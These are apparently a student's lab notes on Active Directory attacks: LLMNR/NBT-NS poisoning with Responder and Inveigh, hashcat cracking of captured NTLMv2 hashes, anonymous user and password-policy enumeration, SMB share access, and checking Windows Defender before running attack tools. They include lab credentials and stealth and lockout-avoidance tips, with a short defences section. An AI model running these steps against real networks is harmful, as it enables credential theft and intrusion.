Complete Notes: LLMNR/NBT-NS Poisoning Attack
1. What is This Attack?
Simple Explanation:
When a Windows machine cant find a server via DNS
it SHOUTS to the whole network "does anyone know where X is?"
WE reply "YES I AM X" 
Victim believes us and sends us their password hash
We crack the hash = we have real credentials
2. Protocols Involved
DNS (Normal)
├── Computer asks DNS server "where is printer01?"
├── DNS replies with IP address
└── Everything works fine ✅

LLMNR (When DNS Fails)
├── Port 5355 UDP
├── Computer broadcasts to ENTIRE network
├── "ANYONE know where printer01 is??"
├── ANY machine can reply ← VULNERABILITY
└── We reply with our IP ← ATTACK

NBT-NS (When LLMNR Also Fails)
├── Port 137 UDP
├── Older protocol same concept
├── Uses NetBIOS names
└── Same vulnerability exists
3. Attack Flow
Step 1: Employee types wrong hostname
        \\fileserver01 → types → \\fileservr01

Step 2: DNS says "never heard of it"

Step 3: Computer broadcasts to network
        "DOES ANYONE KNOW WHERE fileservr01 IS??"

Step 4: WE (attacker) reply immediately
        "YES! I AM fileservr01! CONNECT TO ME!"

Step 5: Victim connects to us
        Sends USERNAME + NTLMv2 PASSWORD HASH

Step 6: We capture the hash

Step 7: We crack hash offline with Hashcat

Step 8: We have real username + password
        = Domain foothold achieved
4. What Triggers This Attack
Human Mistakes:
✅ Typos in hostnames     \\fileserver → \\fileservr
✅ Wrong share names      \\backup01   → \\bakcup01
✅ Old bookmarks          pointing to deleted servers

Automatic (No Human Needed):
✅ Service accounts       run 24/7 automatically
✅ Scheduled tasks        backup jobs, scan jobs
✅ Windows background     OS makes requests itself
✅ Broken applications    pointing to old servers

Most Valuable Automatic Sources:
→ svc_* accounts     (service accounts run constantly)
→ backup* accounts   (backup jobs run at night)
→ admin* accounts    (admin tools phone home)
5. Tools Used
┌─────────────┬──────────────┬────────────────────────────┐
│ Tool        │ Platform     │ Use                        │
├─────────────┼──────────────┼────────────────────────────┤
│ Responder   │ Linux        │ LLMNR/NBT-NS poisoning     │
│ Inveigh.ps1 │ Windows PS   │ PowerShell version         │
│ Inveigh.exe │ Windows C#   │ Better maintained version  │
│ Hashcat     │ Linux/Win    │ Crack captured hashes      │
└─────────────┴──────────────┴────────────────────────────┘
6. Identifying the Right Network Interface
Always run on the interface where VICTIMS are

Your ifconfig showed:
┌──────────┬─────────────────┬──────────────────────────────┐
│Interface │ IP              │ Purpose                      │
├──────────┼─────────────────┼──────────────────────────────┤
│docker0   │ 172.17.0.1      │ Docker containers USELESS ❌ │
│ens192    │ 10.129.116.138  │ HTB VPN connection  USELESS ❌│
│ens224    │ 172.16.5.225    │ Internal network    USE THIS ✅│
│lo        │ 127.0.0.1       │ Loopback            USELESS ❌│
└──────────┴─────────────────┴──────────────────────────────┘

How to confirm right interface:
# Check for Windows machines (port 445 = Windows)
nmap -p 445 172.16.5.0/23 --open

# Ping sweep to find alive hosts
fping -a -g 172.16.5.0/23 2>/dev/null

Rule: Pick interface on SAME network as targets
      IP range means NOTHING about OS type
      Always verify with nmap
7. Responder (Linux) - All Commands
bash
# STEP 1: Analyze mode first (safe, no poisoning)
sudo responder -I ens224 -A
# Just listens, sends nothing
# See who is making LLMNR requests
# Use this for recon first

# STEP 2: Active poisoning
sudo responder -I ens224
# Now actively replies to all requests
# Captures hashes automatically

# STEP 3: With extra options (recommended)
sudo responder -I ens224 -wf
# -w = fake WPAD proxy (catches browser traffic)
# -f = fingerprint victim OS versions

# STEP 4: Run in background with tmux
tmux new -s responder          # create tmux session
sudo responder -I ens224       # run responder inside
CTRL+B then D                  # detach, keep running
tmux attach -t responder       # come back to check later

# STEP 5: Check captured hashes
ls /usr/share/responder/logs/
# Files named: PROTOCOL-HASHTYPE-VICTIMIP.txt
# Example:     SMB-NTLMv2-SSP-172.16.5.25.txt
Responder Options Explained
-I ens224    → which network interface to use
-A           → analyze only, dont poison (safe mode)
-w           → start fake WPAD proxy server
-f           → fingerprint victim OS
-v           → verbose output (more details)
-r           → answer netbios wredir queries
-d           → answer netbios domain queries
-F           → force NTLM auth on WPAD
Responder Log Files
/usr/share/responder/logs/
├── SMB-NTLMv2-SSP-172.16.5.25.txt    ← hash from this IP via SMB
├── SMB-NTLMv2-SSP-172.16.5.200.txt   ← hash from this IP via SMB
├── HTTP-NTLMv2-172.16.5.200.txt      ← hash via HTTP
├── Proxy-Auth-NTLMv2-172.16.5.200.txt← hash via proxy
└── Responder-Session.log              ← full session log
8. Inveigh (Windows) - All Commands
PowerShell Version
powershell
# Import module
Import-Module .\Inveigh.ps1

# Start with recommended options
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# Stop it
Stop-Inveigh

# Check hashes after stopping
$InveighCovert.NTLMv2 | Select-Object -Unique
C# Version (Inveigh.exe)
powershell
# MUST run as Administrator
# Right click PowerShell → Run as Administrator

# Run with defaults
.\Inveigh.exe

# Run without sniffer (if getting socket errors)
.\Inveigh.exe -Sniffer N

# Interactive console commands (press ESC first!)
GET NTLMV2            → all captured NTLMv2 hashes
GET NTLMV2UNIQUE      → one hash per user (no duplicates)
GET NTLMV2USERNAMES   → usernames + IPs only (summary)
GET CLEARTEXT         → any cleartext passwords
STOP                  → stop Inveigh
Difference Between GET Commands
GET NTLMV2USERNAMES shows:
172.16.5.125 | ACADEMY-EA-FILE | svc_qualys | 5F9BB670
                                               ↑
                                    Challenge only NOT crackable
                                    Just tells you WHO you captured

GET NTLMV2UNIQUE shows:
svc_qualys::INLANEFREIGHT:5F9BB670:AABBCC...[full long hash]
↑
FULL hash → copy this → crack with hashcat
Check Output Files
powershell
# Inveigh saves to C:\Tools automatically
type C:\Tools\Inveigh-NTLMv2.txt

# Filter for specific user
Select-String -Path C:\Tools\Inveigh-NTLMv2.txt -Pattern "svc_qualys"
9. Common Inveigh Errors and Fixes
ERROR 1:
"Error starting packet sniffer, check elevated privilege"
FIX: Right click PowerShell → Run as Administrator

ERROR 2:
"Failed to start HTTP listener on port 80"
FIX: Find and kill process using port 80
     netstat -ano | findstr :80
     taskkill /PID [number] /F

ERROR 3:
"GET is not recognized as cmdlet"
FIX: You typed GET in PowerShell terminal
     Press ESC first to enter Inveigh console
     THEN type GET commands

ERROR 4:
Socket permission errors
FIX: Run as Admin AND/OR use -Sniffer N flag
     .\Inveigh.exe -Sniffer N
10. Cracking Hashes with Hashcat
bash
# STEP 1: Save hash to file
echo "USERNAME::DOMAIN:CHALLENGE:HASH:BLOB" > hash.txt

# STEP 2: Basic crack with rockyou
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# STEP 3: If not found, try with rules
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule

# STEP 4: Check if already cracked
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
Hashcat Options Explained
-m 5600      → hash type (5600 = NTLMv2)
hash.txt     → file containing your captured hash
rockyou.txt  → wordlist (14 million real passwords)
--show       → show already cracked passwords
-r           → apply rules (mutates passwords)
best64.rule  → tries Password1 P@ssword etc
Hash Types Reference
NTLMv2    → -m 5600  ← most common from Responder
NTLMv1    → -m 5500
NT hash   → -m 1000  (pass the hash attacks)
11. Hashes We Captured in This Lab
User          │ Hash File              │ Password Found
──────────────┼────────────────────────┼───────────────
FOREND        │ forend_ntlmv2          │ Klmcargo2
backupagent   │ SMB-NTLMv2-SSP-...txt │ (crack it)
wley          │ wley_hash.txt          │ (crack it)
svc_qualys    │ svc_qualys_hash.txt    │ (crack it)
12. Targeting Priority - Which Hashes to Crack First
HIGHEST PRIORITY:
→ svc_*      Service accounts (high privileges, access everywhere)
→ backup*    Backup accounts (need access to ALL machines)
→ admin*     Admin accounts (obvious reasons)
→ *admin*    Anything with admin in name

MEDIUM PRIORITY:
→ Regular domain users (limited but still useful)

WHY service accounts are valuable:
svc_qualys needs to SCAN all machines
= Has local admin on many/all machines
= Cracking it = access to entire domain potentially
13. Complete Attack Chain Summary
Phase 1: Setup
└── ifconfig → identify internal network interface (ens224)
└── nmap -p 445 172.16.5.0/23 → confirm Windows machines there

Phase 2: Capture
└── tmux new -s responder
└── sudo responder -I ens224 -wf
└── Wait 30mins to few hours
└── Let it run while doing other enumeration

Phase 3: Review
└── ls /usr/share/responder/logs/
└── Identify high value accounts (svc_*, backup*, admin*)
└── Prioritize those hashes

Phase 4: Crack
└── hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
└── Try rules if not found: -r best64.rule
└── hashcat --show to see cracked passwords

Phase 5: Use Credentials
└── You now have real domain username + password
└── Begin authenticated enumeration
└── Check what systems the account can access
└── Look for privilege escalation paths
14. Defenses Against This Attack
DISABLE LLMNR:
Group Policy →
Computer Configuration →
Administrative Templates →
Network → DNS Client →
"Turn OFF Multicast Name Resolution" → ENABLE

DISABLE NBT-NS (PowerShell script via GPO):
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach {
    Set-ItemProperty -Path "$regkey\$($_.pschildname)" `
    -Name NetbiosOptions -Value 2
}

OTHER DEFENSES:
→ Enable SMB Signing (prevents relay attacks)
→ Network segmentation (limit broadcast domains)
→ IDS/IPS monitoring ports 5355 and 137
→ Monitor Event IDs 4697 and 7045
→ Monitor registry key:
   HKLM\Software\Policies\Microsoft\Windows NT\DNSClient
   EnableMulticast = 0 means LLMNR disabled
15. Key Things to Remember
1. Responder NEVER stops itself → you CTRL+C when done

2. Always use tmux → run responder in background
   while doing other enumeration tasks

3. Hashes saved even after stopping →
   /usr/share/responder/logs/

4. GET NTLMV2USERNAMES → just shows WHO (not crackable)
   GET NTLMV2UNIQUE    → shows FULL hash (crackable)

5. Press ESC first before typing GET commands in Inveigh

6. Always run Inveigh as Administrator

7. IP range doesnt tell you OS type
   Use nmap -p 445 to confirm Windows machines

8. NTLMv2 hashes CANNOT be used for pass-the-hash
   Must crack them to get plaintext password

9. Service accounts are highest priority targets
   They have more privileges than regular users

10. The longer you run Responder = more hashes captured
    Service accounts trigger automatically
    You dont need humans to make mistakes

Complete Notes: Password Policy & User Enumeration
1. The Big Picture - Why Do We Need This?
Before Password Spraying Attack we need TWO things:

Thing 1: Password Policy
→ How many attempts before account locks?
→ Minimum password length?
→ Password complexity required?
→ This tells us HOW to spray safely

Thing 2: Valid User List
→ WHO exists in the domain?
→ Which accounts to target?
→ This tells us WHO to spray against

Without these two things = you are spraying BLIND
= You will lock accounts = You will get caught
= Client will be angry
2. What is Password Policy?
Think of it like rules for passwords in a company:

Minimum Length: 8 chars    → passwords must be 8+ chars
Complexity: Enabled        → must have UPPER+lower+number+symbol
Lockout Threshold: 5       → 5 wrong attempts = account locked
Lockout Duration: 30 mins  → locked account unlocks after 30 mins
History: 24               → cant reuse last 24 passwords
Max Age: Not Set          → password never expires

WHY THIS MATTERS FOR US:
Threshold = 5
We can safely try 3 passwords (to be safe, not 5)
Wait 31 minutes between each attempt
This way we NEVER lock any account
3. Getting Password Policy - From Linux
Method 1 - With Valid Credentials (CrackMapExec)
bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

What each part means:

crackmapexec    → the tool
smb             → use SMB protocol
172.16.5.5      → Domain Controller IP
-u avazquez     → username we already have
-p Password123  → password we already have
--pass-pol      → get password policy

What you find:

Minimum password length: 8
Password history length: 24
Account Lockout Threshold: 5       ← CRITICAL: max 3 sprays
Locked Account Duration: 30 mins   ← wait 31 mins between sprays
Reset Account Lockout Counter: 30 mins
Password Complexity: Enabled
Maximum password age: Not Set      ← passwords never expire

Use case: You already have one credential from LLMNR
poisoning → use it to get the full policy before spraying

Method 2 - Without Credentials (SMB NULL Session with rpcclient)
bash
# Step 1: Connect anonymously (no username, no password)
rpcclient -U "" -N 172.16.5.5

What each part means:

rpcclient       → RPC client tool
-U ""           → empty username (anonymous)
-N              → no password
172.16.5.5      → Domain Controller IP

What you find after connecting:

rpcclient $>    ← you are now connected anonymously
bash
# Step 2: Get domain info
rpcclient $> querydominfo

What you find:

Domain:      INLANEFREIGHT
Total Users: 3650           ← 3650 users in domain
Server Role: ROLE_DOMAIN_PDC ← this IS the Domain Controller
bash
# Step 3: Get password policy
rpcclient $> getdompwinfo

What you find:

min_password_length: 8
password_properties: DOMAIN_PASSWORD_COMPLEX

Use case: No credentials at all → anonymous access
sometimes works on older/misconfigured Domain Controllers

Method 3 - Without Credentials (enum4linux)
bash
enum4linux -P 172.16.5.5

What each part means:

enum4linux      → automated enumeration tool
-P              → get Password policy only
172.16.5.5      → Domain Controller IP

What you find:

Minimum password length: 8
Password history length: 24
Account Lockout Threshold: 5
Locked Account Duration: 30 minutes
Password Complexity: Enabled

Use case: Simpler than rpcclient, does everything
automatically in one command

Method 4 - Without Credentials (enum4linux-ng - Better Version)
bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight

What each part means:

enum4linux-ng   → newer Python rewrite of enum4linux
-P              → get password policy
172.16.5.5      → Domain Controller IP
-oA ilfreight   → save output as JSON AND YAML files
                  creates ilfreight.json and ilfreight.yaml

What you find:

yaml
domain_password_information:
  pw_history_length: 24
  min_pw_length: 8
  min_pw_age: 1 day 4 minutes
  max_pw_age: not set
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: true

domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: 5

Check saved JSON file:

bash
cat ilfreight.json

Use case: Best for saving results for later use
JSON output can be fed into other tools automatically

Method 5 - Without Credentials (LDAP Anonymous Bind)
bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

What each part means:

ldapsearch              → LDAP query tool
-h 172.16.5.5          → Domain Controller IP
-x                     → simple authentication (anonymous)
-b "DC=INLANEFREIGHT,DC=LOCAL" → where to search in AD
-s sub                 → search all sub-entries
"*"                    → get everything
grep -m 1              → get first match only
-B 10                  → show 10 lines before match
pwdHistoryLength       → find password history setting

What you find:

lockoutThreshold: 5
minPwdLength: 8
pwdProperties: 1        ← 1 means complexity enabled
pwdHistoryLength: 24

Use case: When SMB is blocked but LDAP port 389
is open → alternative way to get policy anonymously

4. Getting Password Policy - From Windows
Method 6 - Built-in Windows Command
cmd
net accounts

What you find:

Minimum password age (days):     1
Maximum password age (days):     Unlimited
Minimum password length:         8
Length of password history:      24
Lockout threshold:               5
Lockout duration (minutes):      30
Lockout observation window:      30

Use case: You landed on a Windows machine and
cant transfer any tools → use what Windows already has

Method 7 - PowerView (Windows)
powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get domain policy
Get-DomainPolicy

What you find:

MinimumPasswordAge=1
MaximumPasswordAge=-1        ← never expires
MinimumPasswordLength=8
PasswordComplexity=1         ← enabled
PasswordHistorySize=24
LockoutBadCount=5
ResetLockoutCount=30
LockoutDuration=30

Use case: Most detailed output, best tool for
Windows-based enumeration with valid credentials

Method 8 - NULL Session from Windows
cmd
net use \\DC01\ipc$ "" /u:""

What each part means:

net use         → connect to network share
\\DC01\ipc$     → special hidden share on DC
""              → empty password
/u:""           → empty username (anonymous)

What you find:

The command completed successfully.
← means NULL session works, DC is misconfigured

Common Error Messages:

Error 1331: Account is disabled
→ Guest account exists but is disabled

Error 1326: Wrong password
→ Account exists but needs real password

Error 1909: Account locked out
→ Too many failed attempts, account is locked

Use case: Test if DC allows anonymous connections
before trying more complex tools

5. Getting User List - All Methods
Method 1 - enum4linux (SMB NULL)
bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

What each part means:

-U                  → enumerate Users
grep "user:"        → filter only user lines
cut -f2 -d"["       → cut text, take part after [
cut -f1 -d"]"       → cut text, take part before ]
Result: clean list of just usernames

What you find:

administrator
guest
krbtgt
htb-student
avazquez
pfalcon
fanthony
wdillard
... (all domain users)

Use case: Quick anonymous user enumeration
No credentials needed if NULL session works

Method 2 - rpcclient (SMB NULL)
bash
# Connect anonymously
rpcclient -U "" -N 172.16.5.5

# Inside rpcclient:
rpcclient $> enumdomusers

What you find:

user:[administrator] rid:[0x1f4]
user:[guest]         rid:[0x1f5]
user:[krbtgt]        rid:[0x1f6]
user:[htb-student]   rid:[0x457]
user:[avazquez]      rid:[0x458]

RID = unique ID number for each user in AD

Use case: Manual control, can do other RPC
commands in same session

Method 3 - CrackMapExec Without Credentials
bash
crackmapexec smb 172.16.5.5 --users

What you find:

INLANEFREIGHT\administrator   badpwdcount: 0  baddpwdtime: 2022-01-10
INLANEFREIGHT\avazquez        badpwdcount: 0  baddpwdtime: 2022-02-17
INLANEFREIGHT\guest           badpwdcount: 0  baddpwdtime: 1600-12-31
                                    ↑
                          CRITICAL INFORMATION
                          badpwdcount = failed login attempts
                          If this is 4 and threshold is 5
                          DO NOT spray this account = it will lock

Use case: Best tool because it shows badpwdcount
Tells you which accounts are SAFE to spray
and which are close to lockout = avoid those

Method 4 - CrackMapExec WITH Credentials
bash
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

What you find:

INLANEFREIGHT\administrator   badpwdcount: 1
INLANEFREIGHT\avazquez        badpwdcount: 20  ← DANGER skip this one
INLANEFREIGHT\pfalcon         badpwdcount: 0

Use case: Most complete user list, authenticated
enumeration gives more accurate data

Method 5 - ldapsearch (LDAP Anonymous)
bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

What each part means:

(&(objectclass=user))   → LDAP filter = get only user objects
grep sAMAccountName:    → get only the username field
cut -f2 -d" "          → clean up output, just usernames

What you find:

guest
htb-student
avazquez
pfalcon
fanthony
wdillard
... (all users)

Use case: When SMB is blocked, use LDAP port 389
Alternative path to same information

Method 6 - windapsearch (LDAP Anonymous - Easier)
bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

What each part means:

--dc-ip 172.16.5.5   → Domain Controller IP
-u ""                → empty username (anonymous)
-U                   → enumerate Users

What you find:

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local

Use case: Easier than ldapsearch, cleaner output
Shows full name AND username = more context

Method 7 - Kerbrute (No Credentials, No NULL Session)
bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

What each part means:

kerbrute            → tool that uses Kerberos protocol
userenum            → enumerate valid usernames
-d inlanefreight.local → domain name
--dc 172.16.5.5    → Domain Controller IP
/opt/jsmith.txt    → wordlist of 48,705 common usernames
                     format: firstname+lastname initial
                     examples: jsmith, bjones, mwilson

What you find:

[+] VALID USERNAME: jjones@inlanefreight.local
[+] VALID USERNAME: sbrown@inlanefreight.local
[+] VALID USERNAME: tjohnson@inlanefreight.local
50+ valid users found in 12 seconds

Why Kerbrute is Special:

Normal failed login  → generates Event ID 4625 (defenders see it)
Kerbrute method      → generates Event ID 4768 (less monitored)
= Stealthier than other methods

BUT:
Username enumeration → does NOT lock accounts ✅
Password spraying with Kerbrute → DOES count toward lockout ⚠️

Use case: When SMB NULL and LDAP anonymous both
fail → last resort for user enumeration
Also stealthier than other methods

6. Analyzing the Password Policy - What It Means for Spraying
Policy We Found:
┌─────────────────────────┬────────┬──────────────────────────────┐
│ Setting                 │ Value  │ Meaning for Us               │
├─────────────────────────┼────────┼──────────────────────────────┤
│ Min Password Length     │ 8      │ Try 8+ char passwords        │
│ Complexity Enabled      │ Yes    │ Need Upper+lower+number      │
│ Lockout Threshold       │ 5      │ Max 3 attempts to be safe    │
│ Lockout Duration        │ 30 min │ Wait 31 mins between sprays  │
│ Max Password Age        │ Not Set│ Passwords never expire       │
│                         │        │ Old weak passwords still work│
│ Password History        │ 24     │ Cant reuse last 24 passwords │
└─────────────────────────┴────────┴──────────────────────────────┘

Good Passwords to Try Based on This Policy:
→ Welcome1        (8 chars, has Upper+lower+number)
→ Password1       (8 chars, Upper+lower+number)
→ Spring2022!     (8 chars, Upper+lower+number+symbol)
→ Company123!     (replace Company with real company name)
→ Inlane2022!     (company name + year + symbol)
7. Complete Attack Chain
Step 1: Try NULL session first (no creds needed)
└── rpcclient -U "" -N 172.16.5.5
└── getdompwinfo    → get policy
└── enumdomusers    → get users

Step 2: If NULL fails try LDAP anonymous
└── ldapsearch -h 172.16.5.5 -x ...
└── windapsearch.py --dc-ip 172.16.5.5 -u "" -U

Step 3: If LDAP fails try Kerbrute
└── kerbrute userenum -d domain --dc IP wordlist.txt

Step 4: If you have credentials (from Responder)
└── crackmapexec smb 172.16.5.5 -u user -p pass --users
└── crackmapexec smb 172.16.5.5 -u user -p pass --pass-pol

Step 5: Analyze results
└── Check lockout threshold (how many sprays allowed)
└── Check badpwdcount (skip accounts close to lockout)
└── Build clean user list

Step 6: Ready for password spraying
└── You have policy → know how many attempts allowed
└── You have user list → know who to target
└── You have password ideas → based on complexity rules
8. Key Rules to Never Break
RULE 1: Always check badpwdcount before spraying
        If badpwdcount = 4 and threshold = 5
        DO NOT spray that account = instant lockout

RULE 2: Always spray LESS than threshold
        Threshold = 5 → spray maximum 3 attempts

RULE 3: Always wait between sprays
        Lockout window = 30 mins → wait 31 mins

RULE 4: Always keep a log
        Which accounts targeted
        Which passwords tried
        What time you sprayed
        Date of spray
        → If client asks why accounts locked you have proof

RULE 5: When in doubt ASK the client
        Better to ask for password policy
        than to lock out 3000 accounts

RULE 6: If you dont know the policy
        Only try ONE password total
        Wait several hours before trying again
        Rather get nothing than lock everything
9. Tools Summary
┌──────────────────┬──────────────┬─────────────────────────────────┐
│ Tool             │ Needs Creds? │ Gets What                       │
├──────────────────┼──────────────┼─────────────────────────────────┤
│ rpcclient        │ No (NULL)    │ Policy + Users                  │
│ enum4linux       │ No (NULL)    │ Policy + Users                  │
│ enum4linux-ng    │ No (NULL)    │ Policy + Users + JSON output    │
│ ldapsearch       │ No (LDAP)    │ Policy + Users                  │
│ windapsearch     │ No (LDAP)    │ Users (cleaner output)          │
│ kerbrute         │ No           │ Valid usernames only            │
│ crackmapexec     │ Both         │ Policy + Users + badpwdcount    │
│ PowerView        │ Yes          │ Policy (most detailed)          │
│ net accounts     │ Yes (local)  │ Policy (built-in Windows)       │
└──────────────────┴──────────────┴─────────────────────────────────┘

Best tool overall: CrackMapExec
→ Works with and without credentials
→ Shows badpwdcount (critical for safe spraying)
→ Gets both policy and users


Check Read/Write Access with smbmap
bash
# With credentials
smbmap -u avazquez -p Password123 -H 172.16.5.5
What you find:

[+] IP: 172.16.5.5
Disk                    Permissions    Comment
----                    -----------    -------
ADMIN$                  NO ACCESS      Remote Admin
C$                      NO ACCESS      Default share
Department Shares       READ ONLY
IPC$                    READ ONLY      Remote IPC
NETLOGON                READ ONLY      Logon server share
SYSVOL                  READ ONLY      Logon server share
User Shares             READ ONLY
ZZZ_archive             READ ONLY
Anonymous Access with smbmap
bash
# No credentials (anonymous)
smbmap -H 172.16.5.5
Your smbclient Error Fix
bash
# Share name has SPACE = use quotes
smbclient "//172.16.5.5/User Shares" -U avazquez

# Anonymous access to share with space
smbclient "//172.16.5.5/User Shares" -N

# Try other shares
smbclient //172.16.5.5/ZZZ_archive -U avazquez
smbclient //172.16.5.5/SYSVOL -U avazquez
What Each Permission Means
NO ACCESS   → cant even see inside
READ ONLY   → can read/download files only
READ WRITE  → can read AND upload files ← most valuable
Simple Rule
smbmap  → shows permissions of ALL shares at once
smbclient → connects to ONE specific share to browse files

Use smbmap FIRST to find which shares have access
Then use smbclient to browse those specific shares

ldapsearch Command Explained Simply
bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
What is LDAP?
LDAP = Lightweight Directory Access Protocol

Think of Active Directory like a PHONEBOOK
LDAP is the LANGUAGE you use to READ that phonebook

Normal situation:
You need USERNAME + PASSWORD to read the phonebook

Anonymous Bind (misconfiguration):
Anyone can read the phonebook WITHOUT credentials
Like a phonebook left open on a table
Anyone walking by can read it
Breaking Down Every Part
bash
ldapsearch          → the tool to query LDAP/Active Directory
bash
-h 172.16.5.5       → HOST = Domain Controller IP
                      this is who we are asking
                      h = host
bash
-x                  → simple authentication
                      means USE ANONYMOUS LOGIN
                      no username no password
                      just connect as nobody
bash
-b "DC=INLANEFREIGHT,DC=LOCAL"   → BASE = where to start searching
                                   DC=INLANEFREIGHT = domain name
                                   DC=LOCAL = domain extension
                                   Together = INLANEFREIGHT.LOCAL
                                   Think of it as the ROOT folder
                                   to start searching from
bash
-s sub              → SCOPE = sub means SUBENTRIES
                      search everything INSIDE the base
                      like searching all subfolders
                      not just the root folder
bash
"*"                 → FILTER = asterisk means EVERYTHING
                      get ALL objects, ALL attributes
                      no filtering at this stage
bash
|                   → PIPE = take the output
                      send it to next command
bash
grep                → search/filter the output
bash
-m 1                → maximum 1 match
                      stop after finding first result
bash
-B 10               → Before = show 10 lines BEFORE the match
                      this is how we see the policy settings
                      that appear before pwdHistoryLength
bash
pwdHistoryLength    → the keyword we are searching for
                      password history setting in AD
                      we use this as an ANCHOR point
                      because password policy settings
                      appear just before this in output
Why grep -B 10 pwdHistoryLength?
The LDAP output is MASSIVE (thousands of lines)
We need only the password policy section

Password policy in LDAP looks like this:
...
lockoutThreshold: 5          ← line -5
maxPwdAge: -9223...          ← line -4  
minPwdAge: -864000000000     ← line -3
minPwdLength: 8              ← line -2
pwdProperties: 1             ← line -1
pwdHistoryLength: 24         ← THIS IS OUR ANCHOR

So by saying:
grep -m 1        → find first occurrence
-B 10            → show 10 lines before it
pwdHistoryLength → the anchor word

We get ALL the password policy settings
in one clean output
What You Find
lockoutDuration: -18000000000      ← 30 minutes lockout
lockOutObservationWindow: -18000000000
lockoutThreshold: 5                ← 5 attempts before lockout
maxPwdAge: -9223372036854775808    ← never expires
minPwdAge: -864000000000           ← 1 day minimum age
minPwdLength: 8                    ← minimum 8 characters
pwdProperties: 1                   ← 1 = complexity enabled
pwdHistoryLength: 24               ← remember last 24 passwords

Note: The big negative numbers are Microsoft's way
of storing time values in LDAP format — just know:

-9223372036854775808 = never expires
-18000000000         = 30 minutes
-864000000000        = 1 day
When to Use This
Use ldapsearch when:
✅ You have NO credentials at all
✅ SMB NULL session is blocked/not working
✅ But LDAP port 389 is open on DC
✅ Domain Controller is misconfigured (allows anonymous)

How to check if LDAP anonymous works:
nmap -p 389 172.16.5.5    → check if port is open
Then run ldapsearch -x    → if it returns data = anonymous works
                            if it returns error = anonymous blocked
Simple Summary
ldapsearch = tool to query Active Directory like a database

-h = who to ask (DC IP)
-x = login as nobody (anonymous)
-b = where to start looking (root of domain)
-s sub = search everything inside
"*" = get all data

Then we filter the massive output with grep
to find just the password policy section
using pwdHistoryLength as our anchor point

Result = full password policy
WITHOUT needing any credentials


Security Controls Enumeration - Complete Detailed Notes
1. Why Do We Check Security Controls?

When we successfully get credentials through password spraying or Responder poisoning, we have what is called a "foothold" in the domain. This means we are inside the network with valid credentials but we are not done yet. Before we start running any enumeration tools or attack tools, we absolutely must understand what security software is running on the machines we are targeting. Different organizations have different levels of security protection and some machines inside the same organization might have stricter controls than others. If we blindly run our hacking tools without checking what security is in place, those tools will get detected, blocked, or deleted and we will alert the defenders that someone is attacking their network. By checking security controls first, we can make smart decisions about which tools to use, how to use them, and whether we need to modify or bypass certain protections before proceeding.

Foothold achieved (have credentials)
            ↓
CHECK SECURITY CONTROLS FIRST
            ↓
        ┌───┴───┐
        │       │
    Strict    Relaxed
    Controls  Controls
        │       │
   Modify    Run tools
   tools     normally
   bypass
   controls
2. Windows Defender
What is Windows Defender?

Windows Defender, now called Microsoft Defender after the Windows 10 May 2020 update, is the built-in antivirus and antimalware solution that comes with every Windows machine for free. Over the years Microsoft has made it extremely powerful and it has gone from being a joke antivirus to one of the best free security solutions available. For us as attackers this is very important because Defender actively monitors everything happening on the system in real time. When we try to run tools like PowerView, BloodHound, or Mimikatz on a machine with Defender enabled, it will detect these tools almost instantly, delete them from disk, and generate security alerts. Defender uses signatures, behavioral analysis, and cloud-based detection to catch malicious tools. This means even if we rename our tools or slightly modify them, Defender might still catch them based on their behavior. Knowing whether Defender is enabled or disabled on a target machine tells us whether we need to find bypass techniques before running our enumeration tools or whether we can proceed normally.

Command to Check Defender
powershell
Get-MpComputerStatus
Breaking Down the Command
Get-Mp            → Get Microsoft Protection information
ComputerStatus    → current status of all protection features
No parameters needed, just run it and read output
Works on any Windows machine with PowerShell
Requires no special privileges to run
What You Find and What It Means
powershell
RealTimeProtectionEnabled : True   
# THIS IS THE MOST IMPORTANT LINE
# True = Defender is actively watching EVERYTHING
# Every file you drop, every command you run
# Gets scanned immediately
# Your tools will be caught and deleted

RealTimeProtectionEnabled : False  
# Defender is disabled
# You can run tools more freely
# Still be careful but much better for us

AMServiceEnabled : True
# Antimalware Service is running in background
# The engine that does the actual scanning

AntivirusEnabled : True
# Traditional virus scanning is active
# Checks files against known virus signatures

AntispywareEnabled : True
# Monitoring for spyware behaviors
# Catches tools that try to steal credentials

BehaviorMonitorEnabled : False
# When True = watches HOW programs behave
# Even unknown tools get caught by behavior
# When False = only signature based detection
# Easier for us to bypass
Practical Example
powershell
# Run this immediately after getting on a Windows machine
Get-MpComputerStatus

# Check specifically for real time protection
Get-MpComputerStatus | Select RealTimeProtectionEnabled

# Output:
RealTimeProtectionEnabled
-------------------------
True                        ← Defender ON = be careful
False                       ← Defender OFF = proceed normally
Why This Matters Practically
Scenario 1: Defender ON
You try to run PowerView.ps1
→ Defender detects it in 2 seconds
→ Deletes the file
→ Generates alert
→ Defenders know you are there
→ Assessment potentially blown

Scenario 2: Defender OFF
You run PowerView.ps1
→ Runs perfectly
→ Full domain enumeration
→ No alerts generated
→ Continue attack chain

